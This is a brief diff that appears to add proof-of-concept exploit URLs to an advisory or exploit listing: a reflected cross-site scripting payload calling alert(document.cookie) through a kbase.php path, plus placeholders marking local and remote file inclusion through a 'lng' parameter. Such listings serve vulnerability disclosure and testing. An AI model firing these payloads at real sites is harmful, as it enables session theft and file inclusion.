@@ -1,0 +1,3 @@
+http://www.example.com/kbase/kbase.php/&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/index.php?lng=[LFI]
+http://www.example.com/index.php?lng=[RFI]
